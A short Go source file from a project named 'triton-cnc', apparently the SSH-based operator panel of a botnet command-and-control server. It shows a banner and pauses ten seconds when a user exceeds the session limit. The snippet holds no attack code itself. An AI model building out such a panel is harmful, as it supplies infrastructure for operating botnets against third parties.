package views

import (
	"strconv"
	"time"
	"triton-cnc/core/mysql"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/models/client/terminal"

	"golang.org/x/crypto/ssh"
)


func MaxSessionsReached(channel ssh.Channel, conn *ssh.ServerConn, User *database.User) error {
	Open := sessions.UserSessions(User.Username)

	var New = map[string]string {
		"open_sessions":strconv.Itoa(Open),
	}

	error,_ := terminal.Banner("max_sessions-reached", User, channel, true, false, New)
	if error != nil {
		return error
	}

	time.Sleep(10 * time.Second)

	return nil
}